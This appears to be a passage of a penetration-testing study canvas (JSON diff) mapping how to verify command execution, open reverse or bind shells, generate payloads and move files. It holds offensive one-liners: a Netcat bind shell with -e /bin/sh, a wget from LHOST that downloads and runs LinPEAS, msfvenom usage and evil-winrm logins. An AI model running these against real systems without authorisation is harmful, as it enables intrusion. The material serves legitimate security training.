@@ -1,0 +1,3229 @@
+{
+  "nodes": [
+    {
+      "id": "topic-group:sessions-transfers",
+      "type": "group",
+      "x": 0,
+      "y": 420,
+      "width": 4400,
+      "height": 22121,
+      "label": "Establish sessions and move files",
+      "color": "2"
+    },
+    {
+      "id": "method-group:session-proof",
+      "type": "group",
+      "x": 35,
+      "y": 3210,
+      "width": 4080,
+      "height": 1304,
+      "label": "Verify command execution, host and represented identity",
+      "color": "2"
+    },
+    {
+      "id": "method-group:session-reverse",
+      "type": "group",
+      "x": 35,
+      "y": 4639,
+      "width": 4080,
+      "height": 1827,
+      "label": "Connect a Linux reverse shell through an available interpreter",
+      "color": "2"
+    },
+    {
+      "id": "method-group:session-windows",
+      "type": "group",
+      "x": 35,
+      "y": 6591,
+      "width": 4080,
+      "height": 1424,
+      "label": "Use Windows authenticated access or a PowerShell command channel",
+      "color": "2"
+    },
+    {
+      "id": "method-group:session-bind",
+      "type": "group",
+      "x": 35,
+      "y": 8140,
+      "width": 4080,
+      "height": 1328,
+      "label": "Use a bind shell when the target can accept inbound connections",
+      "color": "2"
+    },
+    {
+      "id": "method-group:payload-generate",
+      "type": "group",
+      "x": 35,
+      "y": 9593,
+      "width": 4080,
+      "height": 1376,
+      "label": "Generate a payload matching OS, process, format and handler",
+      "color": "2"
+    },
+    {
+      "id": "method-group:session-tty",
+      "type": "group",
+      "x": 35,
+      "y": 11094,
+      "width": 4080,
+      "height": 1304,
+      "label": "Repair a limited Linux terminal",
+      "color": "2"
+    },
+    {
+      "id": "method-group:transfer-http",
+      "type": "group",
+      "x": 35,
+      "y": 12523,
+      "width": 4080,
+      "height": 2676,
+      "label": "Transfer over HTTP using Linux or Windows clients",
+      "color": "2"
+    },
+    {
+      "id": "method-group:transfer-scp",
+      "type": "group",
+      "x": 35,
+      "y": 15324,
+      "width": 4080,
+      "height": 1304,
+      "label": "Copy files through an authenticated SSH service",
+      "color": "2"
+    },
+    {
+      "id": "method-group:transfer-smb",
+      "type": "group",
+      "x": 35,
+      "y": 16753,
+      "width": 4080,
+      "height": 1352,
+      "label": "Move Windows files through an authenticated SMB share",
+      "color": "2"
+    },
+    {
+      "id": "method-group:transfer-stream",
+      "type": "group",
+      "x": 35,
+      "y": 18230,
+      "width": 4080,
+      "height": 1304,
+      "label": "Stream a file over a direct TCP connection",
+      "color": "2"
+    },
+    {
+      "id": "method-group:transfer-text",
+      "type": "group",
+      "x": 35,
+      "y": 19659,
+      "width": 4080,
+      "height": 1328,
+      "label": "Move a small artifact through a text-only channel",
+      "color": "2"
+    },
+    {
+      "id": "method-group:transfer-ftp",
+      "type": "group",
+      "x": 35,
+      "y": 21112,
+      "width": 4080,
+      "height": 1304,
+      "label": "Use a temporary FTP transfer as a constrained fallback",
+      "color": "2"
+    },
+    {
+      "id": "topic:sessions-transfers",
+      "type": "text",
+      "x": 60,
+      "y": 440,
+      "width": 1800,
+      "height": 140,
+      "text": "# Establish sessions and move files\n\nStart with a claimed effect, command primitive or accepted remote identity; a usable shell and return path remain unproved.",
+      "color": "2"
+    },
+    {
+      "id": "flow:sessions-transfers:home",
+      "type": "text",
+      "x": 60,
+      "y": 620,
+      "width": 350,
+      "height": 240,
+      "text": "## Investigation flow\n\nEstablish sessions and move files\n\n · \n\nBranches describe evidence and missing conditions. Follow one useful lead, then return to unfinished coverage.",
+      "color": "6"
+    },
+    {
+      "id": "flow:sessions-transfers:check-0",
+      "type": "text",
+      "x": 560,
+      "y": 620,
+      "width": 760,
+      "height": 396,
+      "text": "## Verify the host and command identity\n\nA single response is not necessarily a stable session. Record the actual destination and output channel.\n\n```bash\nhostname\nid\npwd\nip addr\nip route\n```\n\n**Verify command execution, host and represented identity — on this canvas**"
+    },
+    {
+      "id": "flow:sessions-transfers:check-0-finding-0",
+      "type": "text",
+      "x": 1610,
+      "y": 620,
+      "width": 610,
+      "height": 180,
+      "text": "### Commands execute as the expected target identity\n\nChoose the available callback direction and interpreter.\n\n**Connect a Linux reverse shell through an available interpreter — on this canvas**",
+      "color": "4"
+    },
+    {
+      "id": "flow:sessions-transfers:check-0-finding-1",
+      "type": "text",
+      "x": 1610,
+      "y": 845,
+      "width": 610,
+      "height": 180,
+      "text": "### Callback cannot reach the listener\n\nInspect the actual initiator, destination and route.\n\n[[tracks/11 Execution Troubleshooting.canvas|Diagnose connection direction, listener and session failures in order → 11 Execution Troubleshooting]]",
+      "color": "4"
+    },
+    {
+      "id": "flow:sessions-transfers:check-0-fallback",
+      "type": "text",
+      "x": 2380,
+      "y": 620,
+      "width": 610,
+      "height": 204,
+      "text": "### Unresolved / alternate check\n\nOutput cannot be attributed to the destination: repeat the host/identity proof.\n\n**Verify command execution, host and represented identity — on this canvas**",
+      "color": "2"
+    },
+    {
+      "id": "flow:sessions-transfers:check-1",
+      "type": "text",
+      "x": 560,
+      "y": 1250,
+      "width": 760,
+      "height": 348,
+      "text": "## Transfer a reviewed tool through a reachable route\n\nServe from the attacker and download on the target only when that direction is reachable. Verify the received artifact.\n\n```bash\nwget http://LHOST:8000/linpeas.sh -O /tmp/linpeas.sh\nchmod +x /tmp/linpeas.sh\n/tmp/linpeas.sh | tee /tmp/linpeas.txt\n```\n\n**Transfer over HTTP using Linux or Windows clients — on this canvas**"
+    },
+    {
+      "id": "flow:sessions-transfers:check-1-finding-0",
+      "type": "text",
+      "x": 1610,
+      "y": 1250,
+      "width": 610,
+      "height": 180,
+      "text": "### The verified Linux enumerator is present\n\nRun the LinPEAS baseline and inspect its findings.\n\n[[tracks/07 Linux Privilege Escalation.canvas|Use enumeration tools to generate manually testable candidates → 07 Linux Privilege Escalation]]",
+      "color": "4"
+    },
+    {
+      "id": "flow:sessions-transfers:check-1-finding-1",
+      "type": "text",
+      "x": 1610,
+      "y": 1475,
+      "width": 610,
+      "height": 180,
+      "text": "### HTTP is unavailable but SSH file access works\n\nUse SCP instead of forcing the same failing transport.\n\n**Copy files through an authenticated SSH service — on this canvas**",
+      "color": "4"
+    },
+    {
+      "id": "flow:sessions-transfers:check-1-finding-2",
+      "type": "text",
+      "x": 1610,
+      "y": 1700,
+      "width": 610,
+      "height": 180,
+      "text": "### SMB is the usable authenticated channel\n\nUse the SMB transfer procedure in that identity.\n\n**Move Windows files through an authenticated SMB share — on this canvas**",
+      "color": "4"
+    },
+    {
+      "id": "flow:sessions-transfers:check-1-fallback",
+      "type": "text",
+      "x": 2380,
+      "y": 1250,
+      "width": 610,
+      "height": 204,
+      "text": "### Unresolved / alternate check\n\nBytes differ or the file is missing: fix transfer before interpreting execution errors.\n\n[[tracks/11 Execution Troubleshooting.canvas|Match an artifact to its executable consumer and runtime → 11 Execution Troubleshooting]]",
+      "color": "2"
+    },
+    {
+      "id": "notes:sessions-transfers",
+      "type": "file",
+      "file": "notes/sessions-transfers.md",
+      "x": 60,
+      "y": 2110,
+      "width": 2100,
+      "height": 850
+    },
+    {
+      "id": "notes-label:sessions-transfers",
+      "type": "text",
+      "x": 2350,
+      "y": 2110,
+      "width": 1400,
+      "height": 180,
+      "text": "## Full procedures and alternatives\n\nThe adjacent embedded note is readable here. Scroll inside it for complete variants. Commands and decisions continue below.",
+      "color": "6"
+    },
+    {
+      "id": "method:session-proof:start",
+      "type": "text",
+      "x": 70,
+      "y": 3385,
+      "width": 350,
+      "height": 250,
+      "text": "## Verify command execution, host and represented identity\n\nA PoC, injected command or remote client reports execution",
+      "color": "5"
+    },
+    {
+      "id": "method:session-proof:discover",
+      "type": "text",
+      "x": 570,
+      "y": 3345,
+      "width": 780,
+      "height": 228,
+      "text": "### Discover\n\n```text\nhostname\nid\npwd\n```"
+    },
+    {
+      "id": "method:session-proof:interpret",
+      "type": "text",
+      "x": 1500,
+      "y": 3325,
+      "width": 580,
+      "height": 156,
+      "text": "### What the output establishes\n\nHost-specific identity output demonstrates execution under that account, not yet a reverse connection or full terminal.",
+      "color": "6"
+    },
+    {
+      "id": "method:session-proof:validate",
+      "type": "text",
+      "x": 1500,
+      "y": 3571,
+      "width": 580,
+      "height": 156,
+      "text": "### Missing prerequisite\n\nRecord OS, privilege and network position; choose an access form whose interpreter/service and route exist.",
+      "color": "2"
+    },
+    {
+      "id": "method:session-proof:checks",
+      "type": "text",
+      "x": 570,
+      "y": 3633,
+      "width": 780,
+      "height": 228,
+      "text": "### Validate the condition\n\n```bash\nhostname\nid\npwd\nip addr\nip route\n```"
+    },
+    {
+      "id": "method:session-proof:enabled",
+      "type": "text",
+      "x": 2280,
+      "y": 3275,
+      "width": 620,
+      "height": 276,
+      "text": "### Condition confirmed\n\nThe intended target's command proof is reproducible: use the confirmed foothold as the starting state.\n\n**Verify:** Save destination identity/hostname and actual command output; use Windows hostname/whoami/ipconfig when appropriate.\n\n[[notes/sessions-transfers.md#session-proof|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:session-proof:ruledout",
+      "type": "text",
+      "x": 2280,
+      "y": 3616,
+      "width": 620,
+      "height": 156,
+      "text": "### Condition disproved here\n\nThe tool's success message has no command-specific effect and the operation is rejected: discard its execution claim.",
+      "color": "1"
+    },
+    {
+      "id": "method:session-proof:unknown",
+      "type": "text",
+      "x": 2280,
+      "y": 3837,
+      "width": 620,
+      "height": 156,
+      "text": "### Evidence inconclusive\n\nA hung request with no observable effect leaves execution unknown; obtain a bounded independent observation.",
+      "color": "2"
+    },
+    {
+      "id": "method:session-proof:action",
+      "type": "text",
+      "x": 3130,
+      "y": 3275,
+      "width": 900,
+      "height": 228,
+      "text": "### Procedure entry — full sequence in the note\n\n```text\ndelivery → execution → connection → usable session\n```\n\n[[notes/sessions-transfers.md#session-proof|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:session-proof:next-0",
+      "type": "text",
+      "x": 3130,
+      "y": 3593,
+      "width": 620,
+      "height": 252,
+      "text": "### Connect a Linux reverse shell through an available interpreter\n\n**When:** Linux command execution exists but an interactive channel is needed\n\n**Still required:** A confirmed Bash/Python/PHP/Netcat implementation, correct parser wrapping, target-to-listener route and compatible listener\n\n**Connect a Linux reverse shell through an available interpreter — on this canvas**",
+      "color": "5"
+    },
+    {
+      "id": "method:session-proof:next-1",
+      "type": "text",
+      "x": 3130,
+      "y": 3900,
+      "width": 620,
+      "height": 252,
+      "text": "### Establish Linux state and choose an escalation candidate\n\n**When:** A new Linux foothold or an identity/privilege change\n\n**Still required:** A working command channel and accurate effective identity, group, mount and process context\n\n[[tracks/07 Linux Privilege Escalation.canvas|Establish Linux state and choose an escalation candidate → 07 Linux Privilege Escalation]]",
+      "color": "5"
+    },
+    {
+      "id": "method:session-proof:next-2",
+      "type": "text",
+      "x": 3130,
+      "y": 4207,
+      "width": 620,
+      "height": 252,
+      "text": "### Establish Windows token, host and process context\n\n**When:** A new Windows session or claimed administrator/SYSTEM transition\n\n**Still required:** A functioning command channel and the actual effective token/process context\n\n[[tracks/08 Windows Privilege Escalation.canvas|Establish Windows token, host and process context → 08 Windows Privilege Escalation]]",
+      "color": "5"
+    },
+    {
+      "id": "method:session-reverse:start",
+      "type": "text",
+      "x": 70,
+      "y": 4814,
+      "width": 350,
+      "height": 250,
+      "text": "## Connect a Linux reverse shell through an available interpreter\n\nLinux command execution exists but an interactive channel is needed",
+      "color": "5"
+    },
+    {
+      "id": "method:session-reverse:discover",
+      "type": "text",
+      "x": 570,
+      "y": 4774,
+      "width": 780,
+      "height": 204,
+      "text": "### Discover\n\n```text\ncommand -v bash python3 php nc\nip route get LHOST\n```"
+    },
+    {
+      "id": "method:session-reverse:interpret",
+      "type": "text",
+      "x": 1500,
+      "y": 4754,
+      "width": 580,
+      "height": 156,
+      "text": "### What the output establishes\n\nAn interpreter plus a plausible outbound route suggests a reverse-channel candidate.",
+      "color": "6"
+    },
+    {
+      "id": "method:session-reverse:validate",
+      "type": "text",
+      "x": 1500,
+      "y": 5000,
+      "width": 580,
+      "height": 156,
+      "text": "### Missing prerequisite\n\nVerify target-to-listener reachability, listener binding, exact shell/parser and payload compatibility.",
+      "color": "2"
+    },
+    {
+      "id": "method:session-reverse:enabled",
+      "type": "text",
+      "x": 2280,
+      "y": 4704,
+      "width": 620,
+      "height": 276,
+      "text": "### Condition confirmed\n\nThe minimal connection works and the shell/handler matches: select that reverse channel.\n\n**Verify:** Run hostname/id through the returned channel and distinguish a TCP connection from a functioning shell.\n\n[[notes/sessions-transfers.md#session-reverse|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:session-reverse:ruledout",
+      "type": "text",
+      "x": 2280,
+      "y": 5045,
+      "width": 620,
+      "height": 156,
+      "text": "### Condition disproved here\n\nThe chosen interpreter is absent: reject that interpreter's payload, retaining other available methods.",
+      "color": "1"
+    },
+    {
+      "id": "method:session-reverse:unknown",
+      "type": "text",
+      "x": 2280,
+      "y": 5266,
+      "width": 620,
+      "height": 156,
+      "text": "### Evidence inconclusive\n\nA route entry without packet/connection evidence leaves egress filtering unresolved.",
+      "color": "2"
+    },
+    {
+      "id": "method:session-reverse:action",
+      "type": "text",
+      "x": 3130,
+      "y": 4704,
+      "width": 900,
+      "height": 396,
+      "text": "### Procedure entry — full sequence in the note\n\n```text\ntrigger context\n→ target process/interpreter and architecture\n→ target source interface\n→ route/egress controls\n→ LHOST address visible from target\n→ LPORT\n→ local bind interface\n→ listener/handler\n```\n\n[[notes/sessions-transfers.md#session-reverse|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:session-reverse:next-0",
+      "type": "text",
+      "x": 3130,
+      "y": 5190,
+      "width": 620,
+      "height": 276,
+      "text": "### Repair a limited Linux terminal\n\n**When:** A working shell lacks job control, terminal signals or interactive program support\n\n**Still required:** A working channel and available PTY mechanism; correct local-terminal control sequence\n\n**Repair a limited Linux terminal — on this canvas**",
+      "color": "5"
+    },
+    {
+      "id": "method:session-reverse:next-1",
+      "type": "text",
+      "x": 3130,
+      "y": 5521,
+      "width": 620,
+      "height": 276,
+      "text": "### Diagnose connection direction, listener and session failures in order\n\n**When:** Command execution or payload delivery exists but the expected usable channel does not\n\n**Still required:** A recorded first execution proof, correct advertised route, active compatible listener and observable connection evidence\n\n[[tracks/11 Execution Troubleshooting.canvas|Diagnose connection direction, listener and session failures in order → 11 Execution Troubleshooting]]",
+      "color": "5"
+    },
+    {
+      "id": "method:session-reverse:next-2",
+      "type": "text",
+      "x": 3130,
+      "y": 5852,
+      "width": 620,
+      "height": 252,
+      "text": "### Transfer over HTTP using Linux or Windows clients\n\n**When:** A tool/artifact must reach a target that can make an HTTP request\n\n**Still required:** Correct server bind and served directory; target-to-server route, available downloader and writable destination\n\n**Transfer over HTTP using Linux or Windows clients — on this canvas**",
+      "color": "5"
+    },
+    {
+      "id": "method:session-reverse:next-3",
+      "type": "text",
+      "x": 3130,
+      "y": 6159,
+      "width": 620,
+      "height": 252,
+      "text": "### Use a bind shell when the target can accept inbound connections\n\n**When:** Reverse egress is unavailable but a target listener is reachable\n\n**Still required:** Permission to bind, compatible Netcat/Ncat behavior and source-to-target listener connectivity through any required forward\n\n**Use a bind shell when the target can accept inbound connections — on this canvas**",
+      "color": "5"
+    },
+    {
+      "id": "method:session-windows:start",
+      "type": "text",
+      "x": 70,
+      "y": 6766,
+      "width": 350,
+      "height": 250,
+      "text": "## Use Windows authenticated access or a PowerShell command channel\n\nWindows execution or valid credentials with an available remote service",
+      "color": "5"
+    },
+    {
+      "id": "method:session-windows:discover",
+      "type": "text",
+      "x": 570,
+      "y": 6726,
+      "width": 780,
+      "height": 228,
+      "text": "### Discover\n\n```text\nwhoami /all\n$PSVersionTable\n$ExecutionContext.SessionState.LanguageMode\n```"
+    },
+    {
+      "id": "method:session-windows:interpret",
+      "type": "text",
+      "x": 1500,
+      "y": 6706,
+      "width": 580,
+      "height": 156,
+      "text": "### What the output establishes\n\nThe execution identity and constrained language context affect which command-channel implementations can run.",
+      "color": "6"
+    },
+    {
+      "id": "method:session-windows:validate",
+      "type": "text",
+      "x": 1500,
+      "y": 6952,
+      "width": 580,
+      "height": 156,
+      "text": "### Missing prerequisite\n\nCheck permitted language features, remote endpoint authorization or a working callback route; encoding does not grant those.",
+      "color": "2"
+    },
+    {
+      "id": "method:session-windows:checks",
+      "type": "text",
+      "x": 570,
+      "y": 7014,
+      "width": 780,
+      "height": 204,
+      "text": "### Validate the condition\n\n```powershell\nhostname\nwhoami /all\n$PSVersionTable\n$ExecutionContext.SessionState.LanguageMode\n```"
+    },
+    {
+      "id": "method:session-windows:enabled",
+      "type": "text",
+      "x": 2280,
+      "y": 6656,
+      "width": 620,
+      "height": 276,
+      "text": "### Condition confirmed\n\nA supported native endpoint or verified compatible command channel works: use it and verify its token.\n\n**Verify:** Verify hostname, whoami /all and command behavior through the resulting channel.\n\n[[notes/sessions-transfers.md#session-windows|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:session-windows:ruledout",
+      "type": "text",
+      "x": 2280,
+      "y": 6997,
+      "width": 620,
+      "height": 156,
+      "text": "### Condition disproved here\n\nThe chosen .NET-heavy implementation is blocked by this language mode: discard that implementation.",
+      "color": "1"
+    },
+    {
+      "id": "method:session-windows:unknown",
+      "type": "text",
+      "x": 2280,
+      "y": 7218,
+      "width": 620,
+      "height": 156,
+      "text": "### Evidence inconclusive\n\nUnknown policy/AMSI/endpoint behavior requires identifying the first failing layer.",
+      "color": "2"
+    },
+    {
+      "id": "method:session-windows:action",
+      "type": "text",
+      "x": 3130,
+      "y": 6656,
+      "width": 900,
+      "height": 276,
+      "text": "### Procedure entry — full sequence in the note\n\n```bash\nevil-winrm -i TARGET -u USER -p 'PASSWORD'\nxfreerdp /v:TARGET /u:'DOMAIN\\USER' /p:'PASSWORD' /cert:ignore\nssh -p PORT USER@TARGET\n```\n\n[[notes/sessions-transfers.md#session-windows|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:session-windows:next-0",
+      "type": "text",
+      "x": 3130,
+      "y": 7022,
+      "width": 620,
+      "height": 252,
+      "text": "### Establish Windows token, host and process context\n\n**When:** A new Windows session or claimed administrator/SYSTEM transition\n\n**Still required:** A functioning command channel and the actual effective token/process context\n\n[[tracks/08 Windows Privilege Escalation.canvas|Establish Windows token, host and process context → 08 Windows Privilege Escalation]]",
+      "color": "5"
+    },
+    {
+      "id": "method:session-windows:next-1",
+      "type": "text",
+      "x": 3130,
+      "y": 7329,
+      "width": 620,
+      "height": 276,
+      "text": "### Use WinRM, WinRS or PowerShell remoting\n\n**When:** A WinRM listener and a candidate endpoint-authorized account\n\n**Still required:** Reachable HTTP(S) listener, accepted authentication and endpoint/session configuration permissions; hash/ticket support depends on client/context\n\n[[tracks/09 Active Directory.canvas|Use WinRM, WinRS or PowerShell remoting → 09 Active Directory]]",
+      "color": "5"
+    },
+    {
+      "id": "method:session-windows:next-2",
+      "type": "text",
+      "x": 3130,
+      "y": 7660,
+      "width": 620,
+      "height": 300,
+      "text": "### Distinguish PowerShell policy, language mode and protected execution layers\n\n**When:** PowerShell reports scripts disabled, constrained syntax or an execution-control error\n\n**Still required:** Actual host policy/language context and a supported allowed execution route; required runtime features remain available\n\n[[tracks/11 Execution Troubleshooting.canvas|Distinguish PowerShell policy, language mode and protected execution layers → 11 Execution Troubleshooting]]",
+      "color": "5"
+    },
+    {
+      "id": "method:session-bind:start",
+      "type": "text",
+      "x": 70,
+      "y": 8315,
+      "width": 350,
+      "height": 250,
+      "text": "## Use a bind shell when the target can accept inbound connections\n\nReverse egress is unavailable but a target listener is reachable",
+      "color": "5"
+    },
+    {
+      "id": "method:session-bind:discover",
+      "type": "text",
+      "x": 570,
+      "y": 8275,
+      "width": 780,
+      "height": 204,
+      "text": "### Discover\n\n```text\nnc -h\nss -lnt\n```"
+    },
+    {
+      "id": "method:session-bind:interpret",
+      "type": "text",
+      "x": 1500,
+      "y": 8255,
+      "width": 580,
+      "height": 156,
+      "text": "### What the output establishes\n\nThe implementation cannot use an assumed -e shell; another supported listener mechanism is needed.",
+      "color": "6"
+    },
+    {
+      "id": "method:session-bind:validate",
+      "type": "text",
+      "x": 1500,
+      "y": 8501,
+      "width": 580,
+      "height": 156,
+      "text": "### Missing prerequisite\n\nConfirm a compatible bind command, permitted listener and inbound source-to-target reachability.",
+      "color": "2"
+    },
+    {
+      "id": "method:session-bind:enabled",
+      "type": "text",
+      "x": 2280,
+      "y": 8205,
+      "width": 620,
+      "height": 276,
+      "text": "### Condition confirmed\n\nThe selected implementation binds and the source reaches it: use the verified inbound channel.\n\n**Verify:** Verify reachable listener plus hostname/id over the channel; record and later remove the created listener.\n\n[[notes/sessions-transfers.md#session-bind|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:session-bind:ruledout",
+      "type": "text",
+      "x": 2280,
+      "y": 8546,
+      "width": 620,
+      "height": 156,
+      "text": "### Condition disproved here\n\nThe required inbound connection is filtered and no permitted forward exists: reject this bind route.",
+      "color": "1"
+    },
+    {
+      "id": "method:session-bind:unknown",
+      "type": "text",
+      "x": 2280,
+      "y": 8767,
+      "width": 620,
+      "height": 132,
+      "text": "### Evidence inconclusive\n\nA local listen socket alone leaves remote firewall/access unknown.",
+      "color": "2"
+    },
+    {
+      "id": "method:session-bind:action",
+      "type": "text",
+      "x": 3130,
+      "y": 8205,
+      "width": 900,
+      "height": 228,
+      "text": "### Procedure entry — full sequence in the note\n\n```bash\nnc -lvnp PORT -e /bin/sh\n```\n\n[[notes/sessions-transfers.md#session-bind|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:session-bind:next-0",
+      "type": "text",
+      "x": 3130,
+      "y": 8523,
+      "width": 620,
+      "height": 276,
+      "text": "### Repair a limited Linux terminal\n\n**When:** A working shell lacks job control, terminal signals or interactive program support\n\n**Still required:** A working channel and available PTY mechanism; correct local-terminal control sequence\n\n**Repair a limited Linux terminal — on this canvas**",
+      "color": "5"
+    },
+    {
+      "id": "method:session-bind:next-1",
+      "type": "text",
+      "x": 3130,
+      "y": 8854,
+      "width": 620,
+      "height": 252,
+      "text": "### Relay a single TCP service through a fixed forward\n\n**When:** One reachable pivot can connect to one internal TCP destination\n\n**Still required:** A bindable pivot listener, source-to-listener access and pivot-to-destination connectivity\n\n[[tracks/10 Pivoting.canvas|Relay a single TCP service through a fixed forward → 10 Pivoting]]",
+      "color": "5"
+    },
+    {
+      "id": "method:session-bind:next-2",
+      "type": "text",
+      "x": 3130,
+      "y": 9161,
+      "width": 620,
+      "height": 252,
+      "text": "### Verify command execution, host and represented identity\n\n**When:** A PoC, injected command or remote client reports execution\n\n**Still required:** A functioning execution primitive and an observable output or controlled side effect\n\n**Verify command execution, host and represented identity — on this canvas**",
+      "color": "5"
+    },
+    {
+      "id": "method:payload-generate:start",
+      "type": "text",
+      "x": 70,
+      "y": 9768,
+      "width": 350,
+      "height": 250,
+      "text": "## Generate a payload matching OS, process, format and handler\n\nAn existing exploit/delivery primitive needs a binary or raw payload",
+      "color": "5"
+    },
+    {
+      "id": "method:payload-generate:discover",
+      "type": "text",
+      "x": 570,
+      "y": 9728,
+      "width": 780,
+      "height": 228,
+      "text": "### Discover\n\n```text\nfile TARGET_ARTIFACT\nmsfvenom -l payloads\nmsfvenom --list formats\n```"
+    },
+    {
+      "id": "method:payload-generate:interpret",
+      "type": "text",
+      "x": 1500,
+      "y": 9708,
+      "width": 580,
+      "height": 156,
+      "text": "### What the output establishes\n\nThe staged payload name and executable consumer must be matched to the handler and delivery format.",
+      "color": "6"
+    },
+    {
+      "id": "method:payload-generate:validate",
+      "type": "text",
+      "x": 1500,
+      "y": 9954,
+      "width": 580,
+      "height": 156,
+      "text": "### Missing prerequisite\n\nCheck target/process architecture, permitted feature, exact payload options, stage route and listener.",
+      "color": "2"
+    },
+    {
+      "id": "method:payload-generate:checks",
+      "type": "text",
+      "x": 570,
+      "y": 10016,
+      "width": 780,
+      "height": 180,
+      "text": "### Validate the condition\n\n```bash\nmsfvenom -l payloads\nmsfvenom --list formats\nmsfvenom -p PAYLOAD_NAME --list-options\n```"
+    },
+    {
+      "id": "method:payload-generate:enabled",
+      "type": "text",
+      "x": 2280,
+      "y": 9658,
+      "width": 620,
+      "height": 276,
+      "text": "### Condition confirmed\n\nFormat/architecture/handler and routes all match: generate the selected artifact.\n\n**Verify:** Check artifact format/hash and actual session identity; generation success is not execution proof.\n\n[[notes/sessions-transfers.md#payload-generate|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:payload-generate:ruledout",
+      "type": "text",
+      "x": 2280,
+      "y": 9999,
+      "width": 620,
+      "height": 132,
+      "text": "### Condition disproved here\n\nAn ELF or DLL is supplied to an EXE-only consumer: reject that format.",
+      "color": "1"
+    },
+    {
+      "id": "method:payload-generate:unknown",
+      "type": "text",
+      "x": 2280,
+      "y": 10196,
+      "width": 620,
+      "height": 156,
+      "text": "### Evidence inconclusive\n\nOS architecture without process/delivery evidence does not settle payload compatibility.",
+      "color": "2"
+    },
+    {
+      "id": "method:payload-generate:action",
+      "type": "text",
+      "x": 3130,
+      "y": 9658,
+      "width": 900,
+      "height": 276,
+      "text": "### Procedure entry — full sequence in the note\n\n```bash\nmsfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86'\nmsfvenom --list formats\nmsfvenom -p PAYLOAD_NAME --list-options\n```\n\n[[notes/sessions-transfers.md#payload-generate|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:payload-generate:next-0",
+      "type": "text",
+      "x": 3130,
+      "y": 10024,
+      "width": 620,
+      "height": 252,
+      "text": "### Match an artifact to its executable consumer and runtime\n\n**When:** A downloaded/generated artifact exists but does not run\n\n**Still required:** Matching OS/process architecture, interpreter/loader/runtime, intact bytes, execute/destination permissions and compatible format\n\n[[tracks/11 Execution Troubleshooting.canvas|Match an artifact to its executable consumer and runtime → 11 Execution Troubleshooting]]",
+      "color": "5"
+    },
+    {
+      "id": "method:payload-generate:next-1",
+      "type": "text",
+      "x": 3130,
+      "y": 10331,
+      "width": 620,
+      "height": 276,
+      "text": "### Pair staged payloads with the correct handler and session lifecycle\n\n**When:** A payload connects without a session, or a handler/session exits unexpectedly\n\n**Still required:** Exact payload/architecture/transport pairing, correct listener binding, reachable staging path and suitable job/session configuration\n\n[[tracks/11 Execution Troubleshooting.canvas|Pair staged payloads with the correct handler and session lifecycle → 11 Execution Troubleshooting]]",
+      "color": "5"
+    },
+    {
+      "id": "method:payload-generate:next-2",
+      "type": "text",
+      "x": 3130,
+      "y": 10662,
+      "width": 620,
+      "height": 252,
+      "text": "### Verify command execution, host and represented identity\n\n**When:** A PoC, injected command or remote client reports execution\n\n**Still required:** A functioning execution primitive and an observable output or controlled side effect\n\n**Verify command execution, host and represented identity — on this canvas**",
+      "color": "5"
+    },
+    {
+      "id": "method:session-tty:start",
+      "type": "text",
+      "x": 70,
+      "y": 11269,
+      "width": 350,
+      "height": 250,
+      "text": "## Repair a limited Linux terminal\n\nA working shell lacks job control, terminal signals or interactive program support",
+      "color": "5"
+    },
+    {
+      "id": "method:session-tty:discover",
+      "type": "text",
+      "x": 570,
+      "y": 11229,
+      "width": 780,
+      "height": 204,
+      "text": "### Discover\n\n```text\ntty\ncommand -v python3 script socat\n```"
+    },
+    {
+      "id": "method:session-tty:interpret",
+      "type": "text",
+      "x": 1500,
+      "y": 11209,
+      "width": 580,
+      "height": 156,
+      "text": "### What the output establishes\n\nA functioning socket shell lacks a controlling terminal while a potential PTY mechanism exists.",
+      "color": "6"
+    },
+    {
+      "id": "method:session-tty:validate",
+      "type": "text",
+      "x": 1500,
+      "y": 11455,
+      "width": 580,
+      "height": 156,
+      "text": "### Missing prerequisite\n\nVerify the available PTY mode, local terminal handling and stable connection; privilege remains unchanged.",
+      "color": "2"
+    },
+    {
+      "id": "method:session-tty:enabled",
+      "type": "text",
+      "x": 2280,
+      "y": 11159,
+      "width": 620,
+      "height": 276,
+      "text": "### Condition confirmed\n\nThe supported PTY and local settings restore terminal behavior: use interactive tools in that same identity.\n\n**Verify:** Check tty, signal handling and an interactive program; confirm the same identity remains.\n\n[[notes/sessions-transfers.md#session-tty|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:session-tty:ruledout",
+      "type": "text",
+      "x": 2280,
+      "y": 11500,
+      "width": 620,
+      "height": 156,
+      "text": "### Condition disproved here\n\nThe channel drops before any command executes: reject terminal settings as the first fault.",
+      "color": "1"
+    },
+    {
+      "id": "method:session-tty:unknown",
+      "type": "text",
+      "x": 2280,
+      "y": 11721,
+      "width": 620,
+      "height": 156,
+      "text": "### Evidence inconclusive\n\nNo PTY utility found leaves alternative terminal methods/noninteractive use to investigate.",
+      "color": "2"
+    },
+    {
+      "id": "method:session-tty:action",
+      "type": "text",
+      "x": 3130,
+      "y": 11159,
+      "width": 900,
+      "height": 228,
+      "text": "### Procedure entry — full sequence in the note\n\n```bash\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n```\n\n[[notes/sessions-transfers.md#session-tty|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:session-tty:next-0",
+      "type": "text",
+      "x": 3130,
+      "y": 11477,
+      "width": 620,
+      "height": 252,
+      "text": "### Use an allowed sudo operation to cross a privilege boundary\n\n**When:** sudo -l grants an operation under a more useful identity\n\n**Still required:** Exact executable/run-as/argument rule permits a useful primitive; password tags, environment and policy do not invalidate it\n\n[[tracks/07 Linux Privilege Escalation.canvas|Use an allowed sudo operation to cross a privilege boundary → 07 Linux Privilege Escalation]]",
+      "color": "5"
+    },
+    {
+      "id": "method:session-tty:next-1",
+      "type": "text",
+      "x": 3130,
+      "y": 11784,
+      "width": 620,
+      "height": 252,
